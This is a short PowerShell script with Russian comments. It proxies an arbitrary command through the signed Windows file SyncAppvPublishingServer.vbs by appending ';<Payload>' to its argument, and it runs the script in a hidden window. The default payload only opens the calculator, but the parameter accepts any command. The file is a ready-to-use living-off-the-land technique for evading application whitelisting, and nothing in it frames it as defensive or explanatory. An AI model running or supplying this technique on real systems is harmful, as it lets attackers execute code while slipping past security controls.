param(
    [string]$Payload = 'Start-Process calc'  # Команда PowerShell, по умолчанию запускает kalkulator
)

# Путь к подписанному скрипту
$scriptPath = Join-Path $env:WINDIR 'System32\SyncAppvPublishingServer.vbs'

if (-not (Test-Path $scriptPath)) {
    Write-Error "Не найден файл: $scriptPath"
    exit 1
}

# Формируем аргумент вида ";<Payload>"
$argument = ";$Payload"

# Запускаем SyncAppvPublishingServer.vbs с проксированием команды
Start-Process -FilePath $scriptPath -ArgumentList $argument -WindowStyle Hidden

